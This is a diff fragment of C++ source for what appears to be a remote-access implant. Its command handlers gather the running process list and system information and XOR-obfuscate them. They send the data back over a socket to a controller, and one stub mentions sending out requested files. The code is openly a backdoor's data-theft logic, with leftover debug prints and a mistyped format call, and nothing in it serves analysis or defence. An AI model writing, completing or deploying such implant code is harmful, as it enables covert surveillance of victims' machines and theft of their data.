@@ -672,28 +672,32 @@ int main() {
 			// read command_packet_length bytes into filename
 			// open filename, send chunks back out socket
 		} break;
-/*
+
+		//new case for getRunningProcess;
 		case 2: {
 			printf("processes\n");
-			//data = listProcesses();
-			data = "No Processes Found";
-			printf("list processes length: %d\n", data.length()); //debug
+			printf("debugggggg\n");
+			data = getRunningProcesses();
+			//data = "No Processes Found";
+			//printf("list processes length: %d\n", data.length()); //debug
+			printf("debugggggg2222\n");
+			_tprintf( TEXT("\nPROCESS NAME:  %s"), data );
 			while (offset < data.length()) {
 				string chunk = data.substr(offset, DEFAULT_BUFLEN);
 				char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
 				xor_func(c); // xor the chunk
 				const char* chunkBuffer = c; // put xor'd chunk in this temp buffer
 				printf("sending %d bytes\n", strlen(chunkBuffer)); //debug
-				send(sock, chunkBuffer, DEFAULT_BUFLEN, 0);
+				send(sock, chunkBuffer, strlen(chunkBuffer), 0);
 				offset += DEFAULT_BUFLEN;
 			}
-			strcpy(buf, "endofmessage"); // send string to signify end of message
+			strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
 			xor_func(buf);
 			send(sock, buf, strlen(buf), 0);
 
 		} break;
-*/
-		case 2: {
+
+		case 3: {
 			printf("systeminfo\n");
 			data = getSysInfo();
 			printf("systeminfo length: %d\n", data.length()); //debug
@@ -733,31 +737,6 @@ int main() {
 			send(sock, buf, strlen(buf), 0); //send end delimiter string
 
 		} break;
-
-		//new case for getRunningProcess;
-		case 3: {
-			printf("processes\n");
-			printf("debugggggg\n");
-			data = getRunningProcesses();
-			//data = "No Processes Found";
-			//printf("list processes length: %d\n", data.length()); //debug
-			printf("debugggggg2222\n");
-			_tprintf( TEXT("\nPROCESS NAME:  %s"), data );
-			while (offset < data.length()) {
-				string chunk = data.substr(offset, DEFAULT_BUFLEN);
-				char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
-				xor_func(c); // xor the chunk
-				const char* chunkBuffer = c; // put xor'd chunk in this temp buffer
-				printf("sending %d bytes\n", strlen(chunkBuffer)); //debug
-				send(sock, chunkBuffer, strlen(chunkBuffer), 0);
-				offset += DEFAULT_BUFLEN;
-			}
-			strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
-			xor_func(buf);
-			send(sock, buf, strlen(buf), 0);
-
-		} break;
-
 		}
 		//free(path);
 	}
